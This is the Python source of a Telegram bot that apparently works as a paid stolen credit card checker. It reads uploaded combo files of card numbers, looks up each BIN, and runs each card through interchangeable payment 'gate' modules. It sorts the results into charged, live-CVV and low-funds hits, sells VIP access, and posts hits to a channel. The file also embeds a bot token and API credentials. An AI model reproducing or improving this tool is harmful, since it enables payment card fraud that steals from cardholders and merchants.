import requests
import telebot, time, json
from datetime import datetime, timedelta
from telebot import types
import importlib
import random
import os
from concurrent.futures import ThreadPoolExecutor

# --- CONFIGURATION ---
token = '8732633493:AAH9KqxUhUvbZ5Zo0qw5EcdOWhjFtpk0wq0'
ADMIN_ID = 5831292144
API_ID = '37536372'
API_HASH = 'abcebb0aa8c00b3ccb4a3172b566325d'
CHANNEL_ID = '-1003763847738' 

PREMIUM_EMOJI_IDS = {
    "✅": "6023660820544623088", "🔥": "4956499161319998529", "❌": "6037570896766438989",
    "🐇": "6199501437387412202", "💳": "5472250091332993630", "💠": "5971837723676249096",
    "📝": "4979199472228631981", "🌐": "4956560549287560231", "🎯": "5287535694099536694",
    "🤖": "5927026418616636353", "🤵": "4949560993840629085", "💰": "5971944878815317190",
    "⏸️": "6001440193058444284", "▶️": "6285315214673975495", "🛑": "5420323339723881652",
    "📊": "6032808241891644148", "📦": "6066395745139824604", "📋": "5974235702701853774",
    "🔄": "5971837723676249096", "⏳": "5971837723676249096", "🚀": "6235302918967269680",
    "⚠️": "5420323339723881652", "💎": "4956739572114392015",
}

def get_emj(emoji_char):
    if emoji_char in PREMIUM_EMOJI_IDS:
        return f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS[emoji_char]}">{emoji_char}</tg-emoji>'
    return emoji_char

USERS_FILE = 'users.json'

def load_users_data():
    try:
        if not os.path.exists(USERS_FILE):
            with open(USERS_FILE, 'w', encoding='utf-8') as f:
                json.dump({"allowed_users": {}, "vip_plans": {
                    "1_month": {"price": 10, "days": 30},
                    "3_months": {"price": 25, "days": 90},
                    "1_year": {"price": 80, "days": 365}
                }}, f, indent=4)
        with open(USERS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except: return {"allowed_users": {}, "vip_plans": {}}

def save_users_data(data):
    try:
        with open(USERS_FILE, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=4)
    except: pass

def is_user_allowed(user_id):
    users_data = load_users_data()
    user_id_str = str(user_id)
    if user_id_str == str(ADMIN_ID): return True
    if user_id_str in users_data['allowed_users']:
        user_info = users_data['allowed_users'][user_id_str]
        if 'vip_expiry' in user_info:
            expiry_date = datetime.strptime(user_info['vip_expiry'], '%Y-%m-%d %H:%M:%S')
            if datetime.now() < expiry_date: return True
    return False

GATE_MODULES = []
import glob
for gate_file in glob.glob('gatet*.py'):
    module_name = gate_file.replace('.py', '')
    try: 
        module = importlib.import_module(module_name)
        GATE_MODULES.append(module)
    except: pass

bot = telebot.TeleBot(token, parse_mode="HTML")
active_checks = {}

@bot.message_handler(commands=["start"])
def start(message):
    user_id = message.chat.id
    users_data = load_users_data()
    is_admin = str(user_id) == str(ADMIN_ID)
    status = f"{get_emj('🤵')} OWNER" if is_admin else (f"{get_emj('💎')} VIP USER" if is_user_allowed(user_id) else f"{get_emj('❌')} UNAUTHORIZED")
    expiry = "LIFETIME" if is_admin else (users_data['allowed_users'].get(str(user_id), {}).get('vip_expiry', 'N/A'))

    welcome_msg = f"""
{get_emj('🚀')} <b>WELCOME TO GOOD HQ BOT</b> {get_emj('🚀')}
━━━━━━━━━━━━━━━━━━━━━━━━
{get_emj('💠')} <b>USER ID:</b> <code>{user_id}</code>
{get_emj('📊')} <b>STATUS:</b> <code>{status}</code>
{get_emj('⏳')} <b>EXPIRY:</b> <code>{expiry}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
{get_emj('🎮')} <b>USER COMMANDS:</b>
➜ Send File (.txt) - Start FAST checking
➜ /vipplans - Show VIP pricing
➜ /start - Check your status

{get_emj('🤵')} <b>ADMIN COMMANDS:</b> (Admin Only)
➜ <code>/addvip [user_id] [days]</code> - Add VIP
➜ <code>/broadcast [message]</code> - Message all users
━━━━━━━━━━━━━━━━━━━━━━━━
{get_emj('🌐')} <b>CHANNEL: @Mydev1</b>
"""
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton(f"📢 CHANNEL", url="https://t.me/Mydev1"), types.InlineKeyboardButton(f"👤 OWNER", url=f"tg://user?id={ADMIN_ID}"))
    bot.reply_to(message, welcome_msg, reply_markup=markup)

@bot.message_handler(commands=["vipplans"])
def vipplans(message):
    users_data = load_users_data()
    plans = users_data.get('vip_plans', {})
    text = f"{get_emj('💎')} <b>VIP SUBSCRIPTION PLANS</b> {get_emj('💎')}\n━━━━━━━━━━━━━━━━━━━━━━━━\n"
    for plan, info in plans.items():
        text += f"➜ <b>{plan.replace('_', ' ').title()}:</b> ${info['price']} ({info['days']} Days)\n"
    text += "\n━━━━━━━━━━━━━━━━━━━━━━━━\n{get_emj('🤵')} <b>Contact @Mydev1 to Buy!</b>"
    bot.reply_to(message, text)

@bot.message_handler(commands=["addvip"])
def add_vip(message):
    if str(message.chat.id) != str(ADMIN_ID): return
    args = message.text.split()
    if len(args) < 3:
        bot.reply_to(message, "Usage: <code>/addvip [user_id] [days]</code>")
        return
    
    target_id = args[1]; days = int(args[2])
    users_data = load_users_data()
    expiry_date = datetime.now() + timedelta(days=days)
    expiry_str = expiry_date.strftime('%Y-%m-%d %H:%M:%S')
    
    if target_id not in users_data['allowed_users']:
        users_data['allowed_users'][target_id] = {}
    
    users_data['allowed_users'][target_id]['vip_expiry'] = expiry_str
    save_users_data(users_data)
    
    bot.reply_to(message, f"✅ User <code>{target_id}</code> added as VIP!\nExpiry: <code>{expiry_str}</code>")
    try: bot.send_message(target_id, f"{get_emj('🎉')} <b>CONGRATS!</b>\nYour VIP status has been activated for {days} days.\nExpiry: {expiry_str}")
    except: pass

@bot.message_handler(commands=["broadcast"])
def broadcast(message):
    if str(message.chat.id) != str(ADMIN_ID): return
    msg_text = message.text.replace("/broadcast ", "")
    if not msg_text or msg_text == "/broadcast":
        bot.reply_to(message, "Usage: /broadcast [message]")
        return
    
    users_data = load_users_data()
    all_users = list(users_data['allowed_users'].keys())
    if str(ADMIN_ID) not in all_users: all_users.append(str(ADMIN_ID))
    
    success = 0; fail = 0
    for user_id in all_users:
        try:
            bot.send_message(user_id, f"{get_emj('📢')} <b>ADMIN BROADCAST:</b>\n\n{msg_text}")
            success += 1
        except: fail += 1
    
    bot.reply_to(message, f"✅ Broadcast sent!\nSuccess: {success}\nFailed: {fail}")

def send_to_channel(cc, last, gate_name, user_name, status_type="charged"):
    if status_type == "charged":
        emoji = get_emj('🐇'); title = "CHARGED HIT"
    elif status_type == "cvv":
        emoji = get_emj('💎'); title = "CVV LIVE"
    else:
        emoji = get_emj('💰'); title = "LOW FUNDS"
    
    channel_msg = f"""
{title} {emoji}
━━━━━━━━━━━━━━━━━
Response ━ {last}
Gateway ━ {gate_name}
━━━━━━━━━━━━━━━━━
User ━ {user_name} (💎 PLATINUM USER)
"""
    try: bot.send_message(CHANNEL_ID, channel_msg)
    except: pass

def update_ui(message, stats):
    if stats.get('stop_event', False): return
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton(f"✅ CHARGED: {stats['ch']}", callback_data='n'),
        types.InlineKeyboardButton(f"💳 CCN: {stats['ccn']}", callback_data='n'),
        types.InlineKeyboardButton(f"💎 CVV: {stats['cvv']}", callback_data='n'),
        types.InlineKeyboardButton(f"💰 LOW: {stats['low']}", callback_data='n'),
        types.InlineKeyboardButton(f"❌ DECLINED: {stats['dd']}", callback_data='n'),
        types.InlineKeyboardButton(f"📊 PROGRESS: {stats['checked']}/{stats['total']}", callback_data='n'),
        types.InlineKeyboardButton(f"🛑 STOP", callback_data='stop')
    )
    last_cc = stats.get('last_cc', 'N/A'); last_gate = stats.get('last_gate', 'N/A'); last_resp = stats.get('last_resp', 'Waiting...')
    text = f"""
{get_emj('🔄')} <b>FAST CHECKING IN PROGRESS...</b>
<b>━━━━━━━━━━━━━━</b>
{get_emj('💳')} <b>LAST CC:</b> <code>{last_cc}</code>
{get_emj('🎯')} <b>GATE:</b> <code>{last_gate}</code>
{get_emj('📝')} <b>RESP:</b> <code>{last_resp}</code>
<b>━━━━━━━━━━━━━━</b>
<b>BY: @Mydev1</b>
"""
    try: bot.edit_message_text(chat_id=message.chat.id, message_id=stats['msg_id'], text=text, reply_markup=markup)
    except: pass

def process_cc(cc, message, stats):
    if stats.get('stop_event', False): return
    cc = cc.strip()
    if not cc: return
    stats['last_cc'] = cc
    try: data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6], timeout=5).json()
    except: data = {}
    country = data.get('country_name', 'Unknown'); flag = data.get('country_flag', 'Unknown'); bank = data.get('bank', 'Unknown')
    start_time = time.time(); gate_name = "N/A"; last = "Error"
    if GATE_MODULES:
        random_gate = random.choice(GATE_MODULES)
        gate_name = random_gate.__name__
        stats['last_gate'] = gate_name
        try:
            last_raw = str(random_gate.Tele(cc))
            if '"message":' in last_raw:
                try: last = json.loads(last_raw)['error'].get('message', last_raw)
                except: last = last_raw
            else: last = last_raw if last_raw != "0" else "Site Rejected"
        except: last = "Gateway Error"
    
    stats['last_resp'] = last; execution_time = time.time() - start_time; last_lower = last.lower()
    is_hit = False; is_low = False; is_3ds = False
    hit_k = ['thank', 'success":true', 'thank-you', 'successful', 'Successful!', 'confirmed', 'paid', 'transaction_id']
    low_k = ['insufficient funds', 'low funds', 'money', 'balance']
    three_k = ['additional action', 'authenticate', '3d_secure', 'verification required', 'challenge_required', 'initstripescamodal', 'client_secret', 'strong customer authentication']
    
    if any(k in last_lower for k in three_k): 
        is_3ds = True; last = "3D Authentication Required"
    elif any(k in last_lower for k in hit_k) and '"success":false' not in last_lower and 'error' not in last_lower: 
        is_hit = True; last = "Transaction Successful" if "success" in last_lower else last
    elif any(k in last_lower for k in low_k): 
        is_low = True; last = "Insufficient Funds"

    user_fname = message.from_user.first_name
    user_uname = f"@{message.from_user.username}" if message.from_user.username else "No Username"
    user_display = f"{user_fname} ({user_uname})"
    
    hit_msg = f"""
{get_emj('🔥')} <b>HIT FOUND!</b> {get_emj('🔥')}
<b>━━━━━━━━━━━━━━</b>
{get_emj('💳')} <b>CARD:</b> <code>{cc}</code>
{get_emj('📝')} <b>STATUS:</b> <code>{last}</code>
{get_emj('💠')} <b>BANK:</b> <code>{bank}</code>
{get_emj('🌐')} <b>COUNTRY:</b> <code>{country} {flag}</code>
{get_emj('🎯')} <b>GATE:</b> <code>{gate_name}</code>
{get_emj('⏳')} <b>TIME:</b> <code>{execution_time:.1f}s</code>
<b>━━━━━━━━━━━━━━</b>
<b>BY: @Mydev1</b>
"""
    if is_hit: 
        stats['ch'] += 1; bot.reply_to(message, hit_msg)
        send_to_channel(cc, last, gate_name, user_display, "charged")
    elif is_low: 
        stats['low'] += 1; bot.reply_to(message, hit_msg.replace("HIT FOUND", "LOW FUNDS").replace(get_emj('🔥'), get_emj('💰')))
        send_to_channel(cc, last, gate_name, user_display, "low")
    elif is_3ds: 
        stats['cvv'] += 1; bot.reply_to(message, hit_msg.replace("HIT FOUND", "CVV LIVE").replace(get_emj('🔥'), get_emj('💎')))
        send_to_channel(cc, last, gate_name, user_display, "cvv")
    elif 'security code is incorrect' in last_lower or 'cvc_check_failure' in last_lower: stats['ccn'] += 1
    elif 'Your card does not support this type of purchase' in last_lower or 'transaction_not_allowed' in last_lower: stats['cvv'] += 1
    else: stats['dd'] += 1
    
    stats['checked'] += 1
    if stats['checked'] % 5 == 0 or stats['checked'] == stats['total']: update_ui(message, stats)

@bot.message_handler(content_types=["document"])
def handle_docs(message):
    if not is_user_allowed(message.chat.id):
        bot.reply_to(message, f"{get_emj('❌')} Buy VIP first!"); return
    ko = bot.reply_to(message, f"{get_emj('⏳')} <b>STARTING FAST CHECKER...</b>").message_id
    file_info = bot.get_file(message.document.file_id); downloaded = bot.download_file(file_info.file_path)
    path = f"combo_{message.document.file_id}.txt"
    with open(path, "wb") as f: f.write(downloaded)
    with open(path, 'r', encoding='utf-8') as f: lino = [l.strip() for l in f.readlines() if l.strip()]
    stats = {'ch': 0, 'ccn': 0, 'cvv': 0, 'low': 0, 'dd': 0, 'checked': 0, 'total': len(lino), 'msg_id': ko, 'stop_event': False, 'last_cc': 'N/A', 'last_gate': 'N/A', 'last_resp': 'Waiting...'}
    active_checks[message.chat.id] = stats
    update_ui(message, stats)
    with ThreadPoolExecutor(max_workers=5) as executor:
        for cc in lino:
            if stats['stop_event']: break
            executor.submit(process_cc, cc, message, stats)
            time.sleep(0.05)
    active_checks.pop(message.chat.id, None)
    final_text = f"{get_emj('🛑')} <b>STOPPED BY USER</b>" if stats['stop_event'] else f"{get_emj('✅')} <b>FAST CHECKING COMPLETED!</b>"
    final_markup = types.InlineKeyboardMarkup()
    final_markup.add(types.InlineKeyboardButton(f"✅ {stats['ch']}", callback_data='n'), types.InlineKeyboardButton(f"💳 {stats['ccn']}", callback_data='n'), types.InlineKeyboardButton(f"💎 {stats['cvv']}", callback_data='n'), types.InlineKeyboardButton(f"💰 {stats['low']}", callback_data='n'), types.InlineKeyboardButton(f"❌ {stats['dd']}", callback_data='n'))
    try: bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=final_text, reply_markup=final_markup)
    except: pass
    if os.path.exists(path): os.remove(path)

@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def stop_cb(call):
    user_id = call.message.chat.id
    if user_id in active_checks:
        active_checks[user_id]['stop_event'] = True
        bot.answer_callback_query(call.id, "🛑 Stopping immediately...")
    else: bot.answer_callback_query(call.id, "❌ No active session.")

if __name__ == "__main__":
    bot.delete_webhook()
    print("Fast Bot is running...")
    bot.infinity_polling()
